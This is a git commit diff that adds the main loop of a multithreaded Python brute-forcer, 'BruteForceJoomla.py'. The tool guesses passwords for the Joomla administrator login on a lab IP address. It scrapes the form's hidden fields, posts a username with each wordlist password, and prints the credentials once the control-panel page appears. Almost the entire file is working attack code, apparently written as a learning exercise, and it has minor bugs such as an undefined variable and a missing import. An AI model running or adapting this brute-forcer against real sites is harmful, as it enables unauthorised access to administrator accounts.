31179033a92113c36d3d9f476753c9221236003b
Alex Stocks <stocksalex@icloud.com>
2020-08-19 11:31:48 +0100

    Wrote primary brute forcing class

--- BruteForceJoomla.py
+++ BruteForceJoomla.py
@@ -1,5 +1,6 @@
 import urllib3
 import urllib
+from urllib import request, parse
 import threading
 import sys
 import queue
@@ -17,10 +18,11 @@ target_url = "http://192.168.112.131/administrator/index/php"
 target_post = "http://192.168.112.131/administrator/index.php"
 
 username_field = "username"
-password_filed = "passwd"
+password_field = "passwd"
 
 # string to check for to see if we are successful
 success_check = "Administration - Control Panel"
+
 
 class Bruter():
     def __init__(self, username, words):
@@ -40,5 +42,36 @@ class Bruter():
 
         while not self.password_q.empty() and not self.found:
             brute = self.password_q.get().rstrip()
+
+            # create CookieJar to store all cookies
             jar = http.cookiejar.FileCookieJar("Cookies")
 
+            # pass any cookies to cookie jar
+            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
+
+            # initial request to get login form
+            response = opener.open(target_url)
+            page = response.read()
+
+            print("Trying %s : %s (%d left)" % (self.username, brute, self.password_q.qsize()))
+
+            parser = BruteParser()
+            parser.feed(page)
+
+            post_tags = parser.tag_results
+
+            post_tags[username_field] = self.username
+            post_tags[password_field] = brute
+
+            login_data = urllib.parse.urlencode(post_tags)
+            login_response = opener.open(target_post, login_data)
+
+            login_result = login_response.read()
+
+            if success_check in login_result:
+                self.found = True
+
+                print("[*] Bruteforce successfull.")
+                print("[*] Username: %s" % username)
+                print("[*] Password: %s" % brute)
+                print("[*] Waiting for all threads to finish...")
